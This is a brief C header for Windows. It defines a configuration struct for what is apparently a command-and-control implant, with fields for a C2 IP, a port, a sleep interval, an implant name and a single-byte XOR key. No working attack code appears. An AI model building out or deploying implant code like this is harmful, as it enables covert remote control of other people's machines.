#pragma once
#include <windows.h>

typedef struct _IMPLANT_CONFIG {
    char c2ip[64];
    int  port;
    int  sleep_interval;
    char implant_name[64];
    unsigned char xor_key;
} IMPLANT_CONFIG;